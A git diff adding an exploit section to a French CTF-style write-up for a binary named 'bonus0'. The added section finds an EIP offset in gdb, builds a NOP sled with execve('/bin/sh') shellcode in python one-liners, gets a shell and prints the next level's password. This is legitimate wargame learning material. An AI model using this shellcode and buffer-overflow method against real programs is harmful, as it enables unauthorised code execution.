@@ -171,7 +171,7 @@
       - Enlève 1 à eax (probablement pour le char de fin de string)
       - Add ebp + 8 (main_buffer) à eax (eax = buffer[len(buffer)]
       - Stocke ebx (" ") dans edx et remplit le reste de 0 (edx = " 0000...")
-      - Socke dx (les 12 derniers octets de edx) a la valeur de l'adresse de eax (buffer + len(buffer) = "  0")<br/><br/>
+      - Socke dx (les 12 derniers octets de edx) a la valeur de l'adresse de eax (buffer + len(buffer) = "  ")<br/><br/>
     - <+109> ... <+122>
       - Fait pointer eax sur ebp - 28 (b_buffer)
       - Place eax (b_buffer) sur la stack (à esp + 4)
@@ -231,7 +231,7 @@
       - Stocke 0x0 (0) dans eax
       - Fait pointer eax sur ebp - 4104 (p_buffer)
       - Place 0x14 (20) sur la stack (à esp + 8)
-      - Place eax (0) sur la staxk (à esp + 4)
+      - Place eax (0) sur la stack (à esp + 4)
       - Stocke ebp + 8 (&argv) dans eax
       - Place eax sur la stack (à esp)
       - Call stncpy() avec les arguments placés sur la stack (eax = strncpy(argv[0], stdin, 20))<br/><br/>
@@ -239,3 +239,81 @@
       - Return eax (le return du strncpy)
       - Réinitialisation de la mémoire, fin d'exécution<br/><br/>
 ## Exploit
+
+Toujours pas de call à "/bin/sh", on va encore avoir besoin d'un shellcode.
+On a vu lors de l'analyse que notre programme print(" - "), prend un input sur stdin puis effectue un strncpy de 20 octets. Même logique pour le second input, puis il va copier les deux dans le buffer du main qui fait 42 octets. 
+
+Étant donné que le strncpy de p() n'est pas protégé, il n'écrira pas de catactère de fin de string si l'input est trop long. Puisqu'on strcpy() ensuite dans pp() sans '\0', on va continuer d'écrire et overflow.
+
+Cherchons l'offset:
+- `gdb bonus0`
+  - `set disassembly-flavor intel`
+  - `r`
+    ```
+     - 
+    
+    ```
+    - `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
+      ```
+       - 
+      ```
+      - `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
+        ```
+        [...]
+          Program received signal SIGSEGV, Segmentation fault.
+            0x41336141 in ?? ()
+        [...]
+        ```
+        - On réécrit l'EIP avec le second buffer et le générateur de pattern nous indique un offset de 9 pour la valeur 0x41336141.
+
+L'objectif ici sera donc d'entrer notre shellcode dans le premier argument, et de réécrire l'EIP avec l'adresse de notre shellcode grâce au second input.
+Pour cela on cherche l'adresse de notre premier buffer avant le read, donc on pose un breakpoint à <p +34>:
+
+  - `b * p+34`
+  - `r`
+    ```
+     -
+
+    Breakpoint 1, 0x080484d6 in p ()
+    ```
+    - `x $ebp-0x1008`
+      ```
+      0xbfffe650:	0x00000000
+      ```
+      - l'adresse de notre premier buffer est donc 0xbfffe650
+
+On va donc construire notre payload comme suit:
+- 1er argument:
+  - Suffisamment de NoOp (NOP sled) pour pouvoir tomber sur notre shellcode
+  - [Notre shellcode](https://www.exploit-db.com/exploits/42428)
+- 2eme argument:
+  - "A" * 9
+  - Notre adresse en little endian (4 octets)
+  - "A" * 7
+
+- `(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40> \xcd\x80"'; python -c 'print "A" * 9 + "\x50\xe6\xff\xbf" + "A" * 7'; cat) | ./bonus0`
+  ```
+   -
+   -
+  �����������������������������P������������ ���������P������������
+  
+  ```
+  - `whoami`
+    ```
+    Segmentation fault (core dumped)
+    ```
+Ok ça ne fonctionne pas, c'est probablement que le début du premier buffer a été réécrit, on va essayer avec une adresse un peu plus loin (peu importe tant qu'on tombe sur nos NoOp): 0xbfffe650 => 0xbfffe6ff
+- `(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40> \xcd\x80"'; python -c 'print "A" * 9 + "\xff\xe6\xff\xbf" + "A" * 7'; cat) | ./bonus0`
+  ```
+   -
+   -
+  ��������������������AAAAAAAAA����AAAAAAA�� AAAAAAAAA����AAAAAAA��
+  ```
+  - `whoami`
+    ```
+    bonus1
+    ```
+  - `cat /home/user/bonus1/.pass`
+    ```
+    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+    ```
